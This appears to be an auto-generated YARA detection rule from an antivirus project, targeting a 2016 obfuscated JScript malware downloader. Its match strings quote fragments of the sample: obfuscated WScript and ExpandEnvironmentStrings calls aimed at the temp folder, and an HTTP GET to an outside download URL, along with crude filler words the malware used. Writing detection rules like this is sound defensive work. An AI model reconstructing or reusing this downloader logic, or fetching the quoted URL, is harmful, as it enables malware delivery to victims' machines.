rule sig_20160428_a16cdc44007725dcc0f2777a016612c9 {
  meta:
    description = "datamaliciousorder - file 20160428_a16cdc44007725dcc0f2777a016612c9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "20345a7cfab353eff517208a780c2ae2d76d2a1b4dd72b27f7f4d7af59bc2362"

  strings:
    $s1  = "function CevLxzJvqFloWjwLeuKax(GvgEqtEydTrnOatMemNzg){PkxDdeYmhNalWtqWqnNhf[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function CevLxzJvqFloWjwLeuKax(GvgEqtEydTrnOatMemNzg){PkxDdeYmhNalWtqWqnNhf[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function SkyBexLmwGklDqnUljFvi() {return PkxDdeYmhNalWtqWqnNhf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return CjzBkiQrhAxjGwfDjcXhl - KsbVvyJiqZtaEtgDxvWys;};" fullword ascii
    $s5  = "var PkxDdeYmhNalWtqWqnNhf = function YkjTmsPsvBhvYsuOyaFhc() {return YsfDvaZtbPvmXwnRsqHes[IrpSqsLwvXzkUxmRmgAwm](\"WScript\"+\"" ascii
    $s6  = "function LhxOvqGzdTphJdaUsrJqy(CjzBkiQrhAxjGwfDjcXhl, KsbVvyJiqZtaEtgDxvWys){SazWfbVkqKbnFxyWphWwq = SazWfbVkqKbnFxyWphWwq * 1; " ascii
    $s7  = "VhcVdnUweWcoJhuAtpMso[YziZfhGgnUqiVthFxfDcq](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s8  = "var YsfDvaZtbPvmXwnRsqHes = this[\"WScript\"];" fullword ascii
    $s9  = "var PkxDdeYmhNalWtqWqnNhf = function YkjTmsPsvBhvYsuOyaFhc() {return YsfDvaZtbPvmXwnRsqHes[IrpSqsLwvXzkUxmRmgAwm](\"WScript\"+\"" ascii
    $s10 = "function SkyBexLmwGklDqnUljFvi() {return PkxDdeYmhNalWtqWqnNhf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function EneVquRksKwsEviDiqGos(){return FhhYztQeeSokQgpGjeSus + \"\";};" fullword ascii
    $s12 = "if (VhcVdnUweWcoJhuAtpMso[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function LhxOvqGzdTphJdaUsrJqy(CjzBkiQrhAxjGwfDjcXhl, KsbVvyJiqZtaEtgDxvWys){SazWfbVkqKbnFxyWphWwq = SazWfbVkqKbnFxyWphWwq * 1; " ascii
    $s14 = "function EycQpwJhsRyySloYwnGwd() {return ((SpaDdjIhsAijJxnBuzHdn == true) && (SpaDdjIhsAijJxnBuzHdn == StxGguQsjLiaXznMdvZfk)) ?" ascii
    $s15 = "function EycQpwJhsRyySloYwnGwd() {return ((SpaDdjIhsAijJxnBuzHdn == true) && (SpaDdjIhsAijJxnBuzHdn == StxGguQsjLiaXznMdvZfk)) ?" ascii
    $s16 = "function BjeZfnBkwBaqBccXqvOrv()" fullword ascii
    $s17 = "SpaDdjIhsAijJxnBuzHdn = true; " fullword ascii
    $s18 = "return LhxOvqGzdTphJdaUsrJqy(1 == 1 ? UnqXcoBevWheTtpYehAms : 0, 1 == 1 ? LemDecPqwSkfLjqXkoVtq : 0);" fullword ascii
    $s19 = "LrxJixAwjHxmMcrPzjAnt = true;" fullword ascii
    $s20 = "var SpaDdjIhsAijJxnBuzHdn = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}